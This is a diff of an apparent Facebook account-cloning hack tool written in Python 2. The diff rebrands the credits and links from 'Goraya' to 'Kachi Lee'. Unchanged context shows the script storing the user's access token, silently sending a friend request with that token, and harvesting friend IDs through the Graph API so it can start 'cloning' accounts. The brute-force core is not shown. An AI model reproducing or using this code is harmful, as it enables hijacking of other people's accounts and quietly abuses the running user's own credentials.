@@ -62,7 +62,7 @@ logo = """
 \033[0;39m╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗
 \033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mKachi Lee\033[0;31m║
 \033[0;39m║\033[1;33m* \033[1;33mWhatsapp  \033[1;33m : \033[1;33m\033[4m+2349035850097\033[0m \033[0;31m║
-\033[0;39m║\033[0;36m* \033[0;32mYoutube \033[1;32m: \033[1;32mKachi Lee-tech\033[0;31m║
+\033[0;39m║\033[0;36m* \033[0;32mYoutube \033[1;32m: \033[1;32mKachi tech\033[0;31m║
 \033[0;34m╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""
 
 def tik():
@@ -84,7 +84,7 @@ os.system("clear")
 print "\x1b[0;31m⚔═══════════════════════════☠═══════════════════════════⚔"
 print  """\x1b[0;31m [¤] \x1b[0;31mGREETINGS MY FRIEND\x1b[0;31m  \033[1;96m   [¤] \x1b[0;31mWHATSAPP : +2349035850097\x1b[1;96m  
 \033[1;93m [¤] \x1b[0;31mSTAY HOME\x1b[1;96m      [¤] \x1b[0;31mFACEBOOK : KACHI LEE\x1b[1;96m  
-\033[1;93m [¤] \x1b[0;31mTHIS TOOL IS POWDERED BY KACHI LEE\x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : KACHI LEE TECH\x1b[0;31m"""
+\033[1;93m [¤] \x1b[0;31mTHIS TOOL IS POWDERED BY KACHI LEE\x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : KACHI TECH\x1b[0;31m"""
 print " \x1b[1;93m⚔══════════════════════════☠═══════════════════════════⚔"
 
 CorrectUsername = "IMO"
@@ -100,10 +100,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "yang bener dong"
-            os.system('xdg-open https://https://www.youtube.com/channel/UCcnemPa1LxyajQhlVbEEvcg')
+            os.system('xdg-open https://www.facebook.com/Corneliuschinedumsunday1')
     else:
         print "salah sayang!"
-        os.system('xdg-open https://https://www.youtube.com/channel/UCcnemPa1LxyajQhlVbEEvcg')
+        os.system('xdg-open https://www.facebook.com/Corneliuschinedumsunday1')
 
 def login():
 	os.system('clear')
@@ -144,7 +144,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCKoxMkvX0kdfztguDxxe09w')
+				os.system('xdg-open https://www.facebook.com/Corneliuschinedumsunday1')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -251,7 +251,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 
-		jalan('\033[1;93m[✺] Getting IDs Goraya hacking \033[1;97m...')
+		jalan('\033[1;93m[✺] Getting IDs Kachis hacking \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -269,7 +269,7 @@ def pilih_super():
 			print"\x1b[1;92m[✺] ID Not Found!"
 			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
 			super()
-		print"\033[1;35;40m[✺] Getting IDs...by Goraya hacking"
+		print"\033[1;35;40m[✺] Getting IDs...by Kachis hacking"
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -304,7 +304,7 @@ def pilih_super():
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
 	print "   \033[1;31;48m●💋════════════════════════◄►════════════════════════💋●"
 
-	jalan('                    \033[1;91mGoraya  start cloning Wait...')
+	jalan('                    \033[1;91mKachi  start cloning Wait...')
 	print  "  \033[1;36;48m ●💋════════════════════════◄►════════════════════════💋●" 
 
 	def main(arg):
